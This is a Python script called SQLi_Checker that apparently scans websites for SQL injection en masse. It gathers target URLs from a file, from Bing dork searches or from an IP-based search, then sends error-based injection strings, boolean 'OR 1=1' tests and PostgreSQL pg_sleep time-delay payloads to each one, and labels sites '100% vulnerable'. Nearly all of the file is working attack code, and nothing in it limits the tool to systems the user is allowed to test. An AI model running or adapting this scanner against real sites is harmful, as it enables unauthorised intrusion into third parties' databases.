import requests
import time
import re
import threading
from bs4 import BeautifulSoup


print('''\033[1;36m
                                      010                                       
                                      010                                       
                            000000000 010 000000000                             
                       00000000000000 010 00000000000000                        
                    00000000000000000 010 00000000000000000                     
                 00000000000000       010        0000000000000                  
               00000000000       0    010    0          0000000000                
             00000000          00             00           000000000              
           00000000           000             000            00000000            
          00000000           0000             0000             00000000          
         0000000             0000   1111111   0000              00000000         
       0000000                0000111111111110000                0000000        
       000000                 0011111111111111100                 0000000       
      000000                   11111111111111111                   0000000      
     000000                   1111111111111111111                   000000      
     000000                  111111111111111111111                   000000     
    000000                  11111111111111111111111                  000000     
    000000         0000000011111111111111111111111110000000           00000     
    00000       00000000001111111111111111111111111110000000000       000000    
00000000000000 00000000000111111111111111111111111111100000000000 000000000000000
00000000000000           11111111111111111111111111111            000000000000000
    00000                11111111111111111111111111111                00000    
    000000         00000001111111111111111111111111111000000          00000     
    000000       0000000 11111111111111111111111111111 00000000      000000     
     000000    0000000   11111111111111111111111111111   0000000     00000    
     000000    00         111111111111111111111111110         00    000000      
      000000            00001111111111111111111111100000           000000       
       0000000        00000001111111111111111111110000000         0000000       
        0000000      000000  111111111111111111111   000000     00000000        
         0000000    000        11111111111111111        000    0000000          
          00000000                 111111111                 00000000           
            000000000                                      000000000            
             0000000000                                 000000000              
                00000000000           010           000000000000                
                  000000000000000     010     000000000000000                   
                     0000000000000000 010 0000000000000000                      
                         000000000000 010 0000000000000                         
                              0000000 010 0000000                               
                                      010                                       
                                      010                                      
                             
                   -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                   +      ..| SQLi_Checker v1.1 |..       +
                   -                                      -
                   -              By: Mesh3l              -
                   +         Twitter: Mesh3l_911          +
                   -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                                                 
\033[1;m''')

def Counting():
    for i in range(101):
        print("\r\033[1;36m [>]Ok now,please Gentlemen have ur seat belts fastened,we're about 2 take off ^_* {} \033[1;m".format(i),
              "\033[1;36m%\033[1;m", end="")
        time.sleep(0.02)
    print()
def Blind_Counting():
    for i in range(101):
        print("\r\033[1;36m [>]and now,it's the time for some Blind SQLi.Keep ur seat belts fastened ^_* {} \033[1;m".format(i),
              "\033[1;36m%\033[1;m", end="")
        time.sleep(0.02)
    print()

def SQLi_Checker_path():

    try:
        links_path=input("\033[1;37m [>]Input Urls path : \033[1;m")
        print()
        print()

        with open(links_path, 'r') as f:

            Counting()
            print()

            for url in f.read().splitlines():
                l=url.split('=')[0]
                r=url.split('=')[1]
                eq='='
                payloads=["'",'"',"`","/'/","'||'asd'||'","'or'1'='1","+or+1=1","'or''='",')',"')"]

                for payload in payloads:

                    pattern = r"http\S+"
                    query=l+eq+r+payload
                    content=requests.get(url).text
                    content_urless=re.sub(pattern, "", content)
                    new_content=requests.get(query).text
                    new_content_urless=re.sub(pattern, "", new_content)

                    if content_urless != new_content_urless and 'error in your SQL syntax' not in new_content_urless:
                        print(" \033[1;37m[-+] This website might be vulnerable with this payload go and make sure manually :\033[1;m\033[0;97m {} \033[1;m ".format(query))
                    elif 'error in your SQL syntax' in new_content_urless:
                        print("\033[1;32m [+] This website is 100% vulnerable with this payload ^_^ :\033[1;m\033[0;92m {} \033[1;m ".format(query))
                    else:
                        print(" \033[1;31m [-] This website seems not to be vulnerable with this payload :( :\033[1;m\033[0;91m {} \033[1;m ".format(query))

                print()
            print()
            Blind_Counting()
            with open(links_path, 'r') as f:

                print()

                for url in f.read().splitlines():
                    l = url.split('=')[0]
                    r = url.split('=')[1]
                    eq = '='

                    # Blind_SQLi_Conditional_Responses
                    pattern = r"http\S+"
                    conditional_responses_1 = l + eq + r + "'+OR+1=1--"
                    conditional_responses_2 = l + eq + r + "'+OR+1=2--"


                    content_conditional_responses = requests.get(conditional_responses_1).text
                    content_urless_conditional_responses = re.sub(pattern, "", content_conditional_responses)
                    new_content_conditional_responses = requests.get(conditional_responses_2).text
                    new_conditional_responses = re.sub(pattern, "", new_content_conditional_responses)

                    if content_urless_conditional_responses != new_conditional_responses :
                        print(
                            "\033[1;37m [-+] This website might be vulnerable with this payload go and make sure manually : \033[1;m\n\033[0;97m "
                            "{} \n {} \033[1;m    \n ".format(conditional_responses_1, conditional_responses_2))
                    else:
                        print(
                            "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Conditional_Responses :( : \033[1;m\n\033[0;91m "
                            "{} \n {} \033[1;m    \n ".format(conditional_responses_1, conditional_responses_2))

                    # Blind_SQLi_Conditional_Errors
                    pattern = r"http\S+"
                    conditional_errors_1 = l + eq + r + "'"
                    conditional_errors_2 = l + eq + r + "''"
                    content_conditional_errors = requests.get(conditional_errors_1).text
                    content_urless_conditional_errors = re.sub(pattern, "", content_conditional_errors)
                    new_content_conditional_errors = requests.get(conditional_errors_2).text
                    new_conditional_errors = re.sub(pattern, "", new_content_conditional_errors)

                    if content_urless_conditional_errors != new_conditional_errors:
                        print(
                            "\033[1;37m [-+] This website might be vulnerable with this payload go and make sure manually : \033[1;m\n\033[0;97m "
                            "{} \n {} \033[1;m   \n ".format(conditional_errors_1, conditional_errors_2))
                    else:
                        print(
                            "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Conditional_Errors :( : \033[1;m\n\033[0;91m "
                            "{} \n {} \033[1;m   \n ".format(conditional_errors_1, conditional_errors_2))

                    # Blind_SQLi_Time_Delays
                    pattern = r"http\S+"
                    time_delays_1 = l + eq + r + "'||pg_sleep(10)--"
                    millis_time_delays_payload = requests.get(time_delays_1).elapsed.total_seconds() * 1000

                    if millis_time_delays_payload >= 10000:
                        print(
                            "\033[40m [+] This website is 100% vulnerable with Blind_SQLi_Time_Delays ^_^ : \033[1;m\n\033[0;92m"
                            "{}  \033[1;m \n ".format(time_delays_1))
                    else:
                        print(
                            "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Time_Delays :( : \033[1;m\n\033[0;91m "
                            "{}  \033[1;m \n ".format(time_delays_1))

                    # Blind_SQLi_Time_Delays_And_Information_retrieval
                    pattern = r"http\S+"
                    time_delays_1 = l + eq + r + "'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"
                    time_delays_2 = l + eq + r + "'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"
                    millis_time_delays_1 = requests.get(time_delays_1).elapsed.total_seconds() * 1000
                    millis_time_delays_2 = requests.get(time_delays_2).elapsed.total_seconds() * 1000

                    if millis_time_delays_1 >= 10000 and millis_time_delays_2 < 5000:
                        print(
                            "\033[1;32m [+] This website is 100% vulnerable with Blind_SQLi_Time_Delays_And_Information_retrieval ^_^ : \033[1;m\n\033[0;92m "
                            "{} \n \033[1;m".format(time_delays_1,time_delays_2))
                    else:
                        print(
                            "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Time_Delays_And_Information_retrieval :( : \033[1;m\n\033[0;91m "
                            "{} \n \033[1;m".format(time_delays_1,time_delays_2))

                    print(
                        "\033[1;37m --------------------------------------------------------------------------------------------------------------------------------------- \033[1;m")

                    print()
                print()



    except FileNotFoundError:
        print("\033[1;36mSorry No such file or directory :( , please make sure of the path\033[1;m ")
        print()
        quit()

def Dork_Urls_Spider(dork, pages):
    single_dork = dork
    pages_num = pages
    print()
    print()

    urls = []
    for i in range(1, pages_num):

        url = 'https://www.bing.com/search'
        payload = {'q': single_dork, 'first': i*10-9}
        my_headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
        req = requests.get(url, params=payload, headers=my_headers)
        soup = BeautifulSoup(req.text, 'html.parser')
        url_class = soup.find_all('a')
        for li in url_class:
            try:
                if 'href' in li.attrs:
                    href = str(li.attrs['href'])
                    if 'http' in href and '=' in href and 'microsoft' not in href:
                        urls.append(href)
                    elif 'https' in href and '=' in href and 'microsoft' not in href:
                        urls.append(href)
                    elif 'www' in href and '=' in href and 'microsoft' not in href:
                        urls.append(href)
                    else:
                        continue

            except:
                continue

    return urls
def SQLi_Checker_dork():
    try:
        extracted = []
        the_dork = input("\033[1;37m [>]Input The Dork : \033[1;m")
        the_pages = int(input("\033[1;37m [>]Input Bing.com pages number u wanna search for (at least 2) : \033[1;m"))
        print()
        print()
        for page in range(1, the_pages):
            extracted.extend(Dork_Urls_Spider(the_dork, the_pages))

        extracted = list(set(extracted))
        print('\n \033[1;36m Number of extracted urls : \033[1;m{}  \n'.format(len(extracted)))
        Counting()
        print()

        for url in extracted:
            l = url.split('=')[0]
            r = url.split('=')[1]
            eq = '='
            payloads = ["'", '"', "`", "/'/", "'||'asd'||'", "'or'1'='1", "+or+1=1", "'or''='", ')', "')"]

            for payload in payloads:

                pattern = r"http\S+"
                query = l + eq + r + payload
                content = requests.get(url).text
                content_urless = re.sub(pattern, "", content)
                new_content = requests.get(query).text
                new_content_urless = re.sub(pattern, "", new_content)

                if content_urless != new_content_urless and 'error in your SQL syntax' not in new_content_urless:
                    print(
                        "\033[1;37m [-+] This website might be vulnerable with this payload go and make sure manually :\033[1;m\033[0;97m {} \033[1;m ".format(
                                query))
                elif 'error in your SQL syntax' in new_content_urless:
                    print(
                            "\033[1;32m [+] This website is 100% vulnerable with this payload ^_^ :\033[1;m\033[0;92m {} \033[1;m ".format(
                                query))
                else:
                    print(
                            "\033[1;31m [-] This website seems not to be vulnerable with this payload :( :\033[1;m\033[0;91m {} \033[1;m ".format(
                                query))

            print()
        print()
        Blind_Counting()
        print()
        for url in extracted:
            l = url.split('=')[0]
            r = url.split('=')[1]
            eq = '='

            # Blind_SQLi_Conditional_Responses
            pattern = r"http\S+"
            conditional_responses_1 = l + eq + r + "'+OR+1=1--"
            conditional_responses_2 = l + eq + r + "'+OR+1=2--"
            content_conditional_responses = requests.get(conditional_responses_1).text
            content_urless_conditional_responses = re.sub(pattern, "", content_conditional_responses)
            new_content_conditional_responses = requests.get(conditional_responses_2).text
            new_conditional_responses = re.sub(pattern, "", new_content_conditional_responses)

            if content_urless_conditional_responses != new_conditional_responses:
                print(
                    "\033[1;37m [+] This website is 100% vulnerable with Blind_SQLi_Conditional_Responses ^_^ :\033[1;m \n\033[0;97m "
                    "{} \n {} \033[1;m    \n ".format(conditional_responses_1, conditional_responses_2))
            else:
                print(
                    "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Conditional_Responses :( :\033[1;m \n\033[0;91m "
                    "{} \n {} \033[1;m    \n ".format(conditional_responses_1, conditional_responses_2))

            # Blind_SQLi_Conditional_Errors
            pattern = r"http\S+"
            conditional_errors_1 = l + eq + r + "'"
            conditional_errors_2 = l + eq + r + "''"
            content_conditional_errors = requests.get(conditional_errors_1).text
            content_urless_conditional_errors = re.sub(pattern, "", content_conditional_errors)
            new_content_conditional_errors = requests.get(conditional_errors_2).text
            new_conditional_errors = re.sub(pattern, "", new_content_conditional_errors)

            if content_urless_conditional_errors != new_conditional_errors:
                print(
                    "\033[1;37m [+] This website is 100% vulnerable with Blind_SQLi_Conditional_Errors ^_^ :\033[1;m \n\033[0;97m "
                    "{} \n {} \033[1;m   \n ".format(conditional_errors_1, conditional_errors_2))
            else:
                print(
                    "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Conditional_Errors :( :\033[1;m \n\033[0;91m "
                    "{} \n {} \033[1;m   \n ".format(conditional_errors_1, conditional_errors_2))

            # Blind_SQLi_Time_Delays
            pattern = r"http\S+"
            time_delays_1 = l + eq + r + "'||pg_sleep(10)--"
            millis_time_delays_payload = requests.get(time_delays_1).elapsed.total_seconds() * 1000

            if millis_time_delays_payload >= 10000:
                print(
                    "\033[1;32m [+] This website is 100% vulnerable with Blind_SQLi_Time_Delays ^_^ :\033[1;m \n\033[0;92m "
                    "{}  \033[1;m \n ".format(time_delays_1))
            else:
                print(
                    "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Time_Delays :( :\033[1;m \n\033[0;91m "
                    "{}  \033[1;m \n ".format(time_delays_1))

            # Blind_SQLi_Time_Delays_And_Information_retrieval
            pattern = r"http\S+"
            time_delays_1 = l + eq + r + "'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"
            time_delays_2 = l + eq + r + "'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"
            millis_time_delays_1 = requests.get(time_delays_1).elapsed.total_seconds() * 1000
            millis_time_delays_2 = requests.get(time_delays_2).elapsed.total_seconds() * 1000

            if millis_time_delays_1 >= 10000 and millis_time_delays_2 < 5000:
                print(
                    "\033[1;32m [+] This website is 100% vulnerable with Blind_SQLi_Time_Delays_And_Information_retrieval ^_^ :\033[1;m \n\033[0;92m "
                    "{} \n \033[1;m".format(time_delays_1, time_delays_2))
            else:
                print(
                    "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Time_Delays_And_Information_retrieval :( :\033[1;m \n\033[0;91m "
                    "{} \n \033[1;m".format(time_delays_1, time_delays_2))

            print(
                "\033[1;37m --------------------------------------------------------------------------------------------------------------------------------------- \033[1;m")

            print()
        print()

    except FileNotFoundError:
        print("\033[1;36mPlease make sure that u input the dork and pages number correctly , please make sure of the path\033[1;m ")
        print()
        quit()

def IP_Urls_Spider(IP, pages):
    single_IP = IP
    pages_num = pages
    print()
    print()

    urls = []
    try:
        with open('inurl', 'r') as inurls:

            for inurl in inurls.read().splitlines():

                for i in range(1, pages_num):

                    url = 'https://www.bing.com/search'
                    payload = {'q': 'ip:+'+single_IP+' '+inurl+'', 'first': i*10-9}
                    my_headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
                    req = requests.get(url, params=payload, headers=my_headers)
                    soup = BeautifulSoup(req.text, 'html.parser')
                    url_class = soup.find_all('a')
                    for li in url_class:
                        try:
                            if 'href' in li.attrs:
                                href = str(li.attrs['href'])
                                if 'http' in href and '=' in href and 'microsoft' not in href:
                                    urls.append(href)
                                elif 'https' in href and '=' in href and 'microsoft' not in href:
                                    urls.append(href)
                                elif 'www' in href and '=' in href and 'microsoft' not in href:
                                    urls.append(href)
                                else:
                                    continue

                        except:
                            print("miao")
    except FileNotFoundError:
        print("\033[1;36mSorry No such file or directory :( , please make sure of inurl file\033[1;m ")
        print()
        quit()

    return urls
def SQLi_Checker_ip():
    try:
        extracted = []
        the_ip = input("\033[1;37m [>]Input The IP : \033[1;m")
        the_pages = int(input("\033[1;37m [>]Input Bing.com pages number u wanna search for (at least 2) : \033[1;m"))
        print()
        print()
        print("\r\033[1;36m [>]Please be patient, we're collecting urls ^_^ ...\033[1;m")
        for page in range(1, the_pages):
            extracted.extend(IP_Urls_Spider(the_ip, the_pages))

        extracted = list(set(extracted))
        print('\n \033[1;36m Number of extracted urls : \033[1;m{}  \n'.format(len(extracted)))
        Counting()
        print()

        for link in extracted:
            l = link.split('=')[0]
            r = link.split('=')[1]
            eq = '='
            payloads = ["'", '"', "`", "/'/", "'||'asd'||'", "'or'1'='1", "+or+1=1", "'or''='", ')', "')"]

            for payload in payloads:

                pattern = r"http\S+"
                query = l + eq + r + payload
                content = requests.get(link).text
                content_urless = re.sub(pattern, "", content)
                new_content = requests.get(query).text
                new_content_urless = re.sub(pattern, "", new_content)

                if content_urless != new_content_urless and 'error in your SQL syntax' not in new_content_urless:
                    print(
                        "\033[1;37m [-+] This website might be vulnerable with this payload go and make sure manually :\033[1;m\033[0;97m {} \033[1;m ".format(
                            query))
                elif 'error in your SQL syntax' in new_content_urless:
                    print(
                        "\033[1;32m [+] This website is 100% vulnerable with this payload ^_^ :\033[1;m\033[0;92m {} \033[1;m ".format(
                            query))
                else:
                    print(
                        "\033[1;31m [-] This website seems not to be vulnerable with this payload :( :\033[1;m\033[0;91m {} \033[1;m ".format(
                            query))
            print()
        print()
        Blind_Counting()
        print()
        for url in extracted:
            l = url.split('=')[0]
            r = url.split('=')[1]
            eq = '='

            # Blind_SQLi_Conditional_Responses
            pattern = r"http\S+"
            conditional_responses_1 = l + eq + r + "'+OR+1=1--"
            conditional_responses_2 = l + eq + r + "'+OR+1=2--"
            content_conditional_responses = requests.get(conditional_responses_1).text
            content_urless_conditional_responses = re.sub(pattern, "", content_conditional_responses)
            new_content_conditional_responses = requests.get(conditional_responses_2).text
            new_conditional_responses = re.sub(pattern, "", new_content_conditional_responses)

            if content_urless_conditional_responses != new_conditional_responses:
                print(
                    "\033[1;37m [-+] This website might be vulnerable with this payload go and make sure manually : \033[1;m\n\033[0;97m "
                    "{} \n {} \033[1;m    \n ".format(conditional_responses_1, conditional_responses_2))
            else:
                print(
                    "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Conditional_Responses :( :\033[1;m \n\033[0;91m"
                    "{} \n {} \033[1;m    \n ".format(conditional_responses_1, conditional_responses_2))

            # Blind_SQLi_Conditional_Errors
            pattern = r"http\S+"
            conditional_errors_1 = l + eq + r + "'"
            conditional_errors_2 = l + eq + r + "''"
            content_conditional_errors = requests.get(conditional_errors_1).text
            content_urless_conditional_errors = re.sub(pattern, "", content_conditional_errors)
            new_content_conditional_errors = requests.get(conditional_errors_2).text
            new_conditional_errors = re.sub(pattern, "", new_content_conditional_errors)

            if content_urless_conditional_errors != new_conditional_errors:
                print(
                    "\033[1;37m [-+] This website might be vulnerable with this payload go and make sure manually : \033[1;m\n\033[0;97m "
                    "{} \n {} \033[1;m   \n ".format(conditional_errors_1, conditional_errors_2))
            else:
                print(
                    "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Conditional_Errors :( :\033[1;m \n\033[0;91m"
                    "{} \n {} \033[1;m   \n ".format(conditional_errors_1, conditional_errors_2))

            # Blind_SQLi_Time_Delays
            pattern = r"http\S+"
            time_delays_1 = l + eq + r + "'||pg_sleep(10)--"
            millis_time_delays_payload = requests.get(time_delays_1).elapsed.total_seconds() * 1000

            if millis_time_delays_payload >= 10000:
                print(
                    "\033[1;32m [+] This website is 100% vulnerable with Blind_SQLi_Time_Delays ^_^ :\033[1;m \n\033[0;92m"
                    "{}  \033[1;m \n ".format(time_delays_1))
            else:
                print(
                    "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Time_Delays :( :\033[1;m \n\033[0;91m"
                    "{}  \033[1;m \n ".format(time_delays_1))

            # Blind_SQLi_Time_Delays_And_Information_retrieval
            pattern = r"http\S+"
            time_delays_1 = l + eq + r + "'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"
            time_delays_2 = l + eq + r + "'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"
            millis_time_delays_1 = requests.get(time_delays_1).elapsed.total_seconds() * 1000
            millis_time_delays_2 = requests.get(time_delays_2).elapsed.total_seconds() * 1000

            if millis_time_delays_1 >= 10000 and millis_time_delays_2 < 5000:
                print(
                    "\033[1;32m [+] This website is 100% vulnerable with Blind_SQLi_Time_Delays_And_Information_retrieval ^_^ :\033[1;m \n\033[0;92m"
                    "{} \n \033[1;m".format(time_delays_1, time_delays_2))
            else:
                print(
                    "\033[1;31m [-] This website seems not to be vulnerable with Blind_SQLi_Time_Delays_And_Information_retrieval :( :\033[1;m \n\033[0;91m"
                    "{} \n \033[1;m".format(time_delays_1, time_delays_2))

            print(
                "\033[1;37m --------------------------------------------------------------------------------------------------------------------------------------- \033[1;m")

            print()
        print()

    except FileNotFoundError:
        print("\033[1;36mPlease make sure that u input the ip and pages number correctly , please make sure of the path\033[1;m ")
        print()
        quit()

def Choices():
    print(" \033[0;93m[1] Collected Urls \n [2] By single Dork \n [3] By single IP\033[1;m\n")
    true=True
    while true:
        try:
            choice = int(input("\033[1;37m What's ur choice 1 , 2 or 3 ? Press (9) to quit : \033[1;m"))
            if choice == 1:
                sqli_path_thread=threading.Thread(target=SQLi_Checker_path)
                sqli_path_thread.start()
                sqli_path_thread.join()

                print("\n \033[1;36m Hope u enjoyed the trip , take care ^_*  \033[1;m\n")
                break
            elif choice == 2:
                sqli_dork_thread = threading.Thread(target=SQLi_Checker_dork)
                sqli_dork_thread.start()
                sqli_dork_thread.join()

                print("\n \033[1;36m Hope u enjoyed the trip , take care ^_* .Press (9) to quit \033[1;m\n")
                break
            elif choice == 3:
                sqli_ip_thread = threading.Thread(target=SQLi_Checker_ip)
                sqli_ip_thread.start()
                sqli_ip_thread.join()

                print("\n \033[1;36m Hope u enjoyed the trip , take care ^_* .Press (9) to quit \033[1;m\n")
                break
            elif choice ==9:
                print("\033[1;37m Good Bye ^_^ \033[1;m \n")
                true=False
                quit()
                break
            else:
                print("\033[1;37m Sorry u have to choose either 1 or 2 .Press (9) to quit \033[1;m\n")

        except:
            print("\033[1;37m u gotta choose a proper choice ^_^ .Press (9) to quit \033[1;m\n")
            print()
def main():
    Choices()
if __name__ == '__main__':
    main()